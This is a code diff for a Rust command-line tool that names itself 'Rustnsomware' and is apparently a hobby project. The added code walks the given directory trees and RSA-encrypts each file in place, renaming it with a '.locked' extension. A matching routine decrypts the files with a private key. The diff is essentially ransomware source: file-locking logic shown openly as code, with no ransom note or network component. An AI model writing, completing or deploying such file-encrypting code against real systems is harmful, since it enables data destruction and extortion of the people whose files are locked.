@@ -1,12 +1,16 @@
 use clap::Parser;
 use filenamify::filenamify;
 use rand;
-use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
+use rsa::pkcs1::{
+    DecodeRsaPrivateKey, DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey,
+};
 use rsa::pkcs8::LineEnding;
 use rsa::{pkcs8::DecodePublicKey, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
+use std::borrow::Borrow;
 use std::collections::LinkedList;
 use std::fs::{self};
 use std::io::{Read, Write};
+use std::path::Path;
 use std::{env, io};
 
 /// > Rustnsomware: encrypt and decrypt filesystem
@@ -84,92 +88,10 @@ fn generate_keys() {
     println!("keys generated");
 }
 
-fn encrypt_files() {}
-fn decrypt_files() {}
-
-fn execute_command(command: RustnsomwareCommand) {
-    match command {
-        RustnsomwareCommand::GenerateKeys => generate_keys(),
-        RustnsomwareCommand::Encrypt => encrypt_files(),
-        RustnsomwareCommand::Decrypt => decrypt_files(),
-    }
-}
-
-fn main() {
-    let args = Args::parse();
-    // let _p = args.public_key.clone();
-    let mut files: LinkedList<String> = LinkedList::new();
-
+fn traverse_file_tree(args: &Args, callback: &dyn Fn(&Path) -> ()) {
     let program_name = env::current_exe().expect("WTF??");
-    dbg!(program_name);
-    dbg!(args.public_key);
-    dbg!(args.private_key);
 
-    match args.command {
-        None => {
-            println!("No command provided, exiting");
-            std::process::exit(1);
-        }
-        Some(command) => execute_command(command),
-    }
-
-    /*
-    let mut rng = rand::thread_rng();
-    // let bits = 2048;
-    let public_key = RsaPublicKey::from_public_key_pem(&p).expect("failure");
-    */
-    let mut rng = rand::thread_rng();
-    let bits = 2048;
-    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
-    let pub_key = RsaPublicKey::from(&priv_key);
-
-    let data = get_file_as_byte_vec(&String::from("test/foo.txt"));
-
-    let enc_data = pub_key
-        .encrypt(&mut rng, Pkcs1v15Encrypt, &data)
-        .expect("failed to encrypt")
-        .to_vec();
-
-    // dbg!(&enc_data);
-
-    // dbg!(str::from_utf8(&enc_data).unwrap()); //.expect("msg")); // enc_data);
-
-    let mut file = fs::OpenOptions::new()
-        .create(true)
-        .write(true)
-        .truncate(true)
-        .open("test/foo.txt")
-        .unwrap();
-
-    file.write_all(&enc_data).expect("AA");
-    fs::rename("test/foo.txt", "test/foo.txt.locked").expect("CCC");
-
-    let file_data = get_file_as_byte_vec(&String::from("test/foo.txt.locked"));
-    assert!(enc_data == file_data);
-
-    let dec_data = priv_key
-        .decrypt(Pkcs1v15Encrypt, &enc_data)
-        .expect("failed to decrypt");
-    let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");
-    dbg!(s);
-
-    /*
-        let mut file = fs::OpenOptions::new()
-        .create(true)
-        .write(true)
-        .truncate(true)
-        .open("test/foo.txt")
-        .unwrap();
-
-    file.write_all(&dec_data).expect("BB");
-    */
-
-    /*
-    if args.key.is_some() {
-        println!("{}", args.key.unwrap());
-    }
-    */
-
+    let mut files: LinkedList<String> = LinkedList::new();
     args.paths.iter().for_each(|file| {
         files.push_back(String::from(file));
     });
@@ -178,7 +100,8 @@ fn main() {
         let current_file = files.pop_front().expect("This should not happen");
         let metadata = fs::metadata(current_file.clone()).unwrap();
 
-        /* TODO: skip if executable name is equal to current file
+        //TODO: skip if executable name is equal to current file
+        /*
         if current_file == program_name.file_name().expect("WTF") {
             continue;
         }
@@ -195,8 +118,89 @@ fn main() {
                 ));
             });
         } else if metadata.is_file() {
-            println!("{}", current_file);
+            callback(Path::new(&current_file))
         }
+    }
+}
+
+fn encrypt_file(public_key: RsaPublicKey, path: &Path) {
+    let mut rng = rand::thread_rng();
+    let data = get_file_as_byte_vec(&path.to_str().unwrap().to_string());
+
+    let enc_data = public_key
+        .encrypt(&mut rng, Pkcs1v15Encrypt, &data)
+        .expect("failed to encrypt")
+        .to_vec();
+
+    let mut file = fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)
+        .unwrap();
+
+    file.write_all(&enc_data).expect("AA");
+
+    fs::rename(path, String::from(path.to_str().unwrap()) + ".locked")
+        .expect("Error while renaming file");
+}
+
+fn encrypt_files(args: &Args) {
+    let pub_key =
+        RsaPublicKey::read_pkcs1_pem_file(args.public_key.as_ref().expect("No public key path"))
+            .unwrap();
+
+    traverse_file_tree(args, &|path: &Path| encrypt_file(pub_key.to_owned(), &path));
+}
+
+fn decrypt_file(private_key: RsaPrivateKey, path: &Path) {
+    let enc_data = get_file_as_byte_vec(&path.to_str().unwrap().to_string());
+
+    let dec_data = private_key
+        .decrypt(Pkcs1v15Encrypt, &enc_data)
+        .expect("failed to decrypt");
+    // let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");
+
+    let mut file = fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)
+        .unwrap();
+
+    file.write_all(&dec_data).expect("AA");
+
+    fs::rename(path, path.with_extension("")) // String::from(path.to_str().unwrap())
+        .expect("Error while renaming file");
+}
+
+fn decrypt_files(args: &Args) {
+    let priv_key =
+        RsaPrivateKey::read_pkcs1_pem_file(args.private_key.as_ref().expect("No private key path"))
+            .unwrap();
+
+    traverse_file_tree(args, &|path: &Path| {
+        decrypt_file(priv_key.to_owned(), &path)
+    });
+}
+
+fn execute_command(command: RustnsomwareCommand, args: &Args) {
+    match command {
+        RustnsomwareCommand::GenerateKeys => generate_keys(),
+        RustnsomwareCommand::Encrypt => encrypt_files(args),
+        RustnsomwareCommand::Decrypt => decrypt_files(args),
+    }
+}
+
+fn main() {
+    let args = Args::parse();
+    let command = &args.command;
+    match command.to_owned() {
+        None => {
+            println!("No command provided, exiting");
+            std::process::exit(1);
+        }
+        Some(command) => execute_command(command, &args),
     }
 
     std::process::exit(0);
